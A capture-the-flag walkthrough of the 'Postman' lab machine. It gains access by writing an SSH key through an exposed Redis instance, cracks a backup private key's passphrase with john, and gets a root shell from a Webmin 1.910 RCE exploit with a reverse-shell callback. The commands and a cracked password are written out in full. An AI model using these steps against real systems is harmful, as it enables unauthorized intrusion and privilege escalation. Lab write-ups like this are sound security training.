# Postman

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.2.1   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 02:05 EDT
Nmap scan report for 10.129.2.1
Host is up (0.0065s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
```

Redis is open interestingly. So we can try to check for vulnerabilities there first.

### SSH Key Write

We can connect to Redis using `redis-cli`.&#x20;

```
$ redis-cli -h 10.129.2.1
10.129.2.1:6379> info
# Server
redis_version:4.0.9
```

The Redis version is really outdated, so we can try to find some exploits regarding it. Hacktricks has some methods of exploiting this by writing SSH keys.&#x20;

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh" %}

Just follow these commands:

```bash
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
redis-cli -h 10.129.2.1
config set dir /var/lib/redis/.ssh
config set dbfilename "authorized_keys"
save
exit
chmod 600 id_rsa
ssh -i id_rsa redis@10.129.2.1
```

This would generate a pair of keys, and afterwards write it into the machine as the keys for `redis`. Then we can directly SSH in.

<figure><img src="../../../.gitbook/assets/image (2621).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### User SSH Key

Within the `/home` directory, we find the user is called Matt

```
redis@Postman:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
drwxr-xr-x  6 Matt Matt 4096 Sep 11  2019 Matt
```

Within the `/opt` directory, there's a password encrypted `id_rsa` file.&#x20;

```
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
```

We can download this back to our machine and use `ssh2john` and `john` to crack it.&#x20;

```
$ ssh2john id_rsa.bak > hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)     
1g 0:00:00:00 DONE (2023-05-02 02:17) 9.090g/s 2243Kp/s 2243Kc/s 2243KC/s confused6..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Great! We now have a password for the user. We can use `su` to change from `redis` to `Matt`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3221).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag.

### Webmin

In the earlier `nmap` scan, we found that there were some HTTP ports that I didn't touch till now. Port 10000 has a Webmin instance running, and we can login using the credentials we just found.

<figure><img src="../../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3718).png" alt=""><figcaption></figcaption></figure>

This was running Webmin 1.910, which is vulnerable to RCE through Package Updates. There are tons of PoCs online.

{% embed url="https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/blob/master/exploit_poc.py" %}

```bash
$ python3 rce.py --ip_address 10.129.2.1 --port 10000 --lhost 10.10.14.13 --lport 4444 --user Matt --password computer2008
```

This would give us an easy `root` shell.

<figure><img src="../../../.gitbook/assets/image (2483).png" alt=""><figcaption></figcaption></figure>
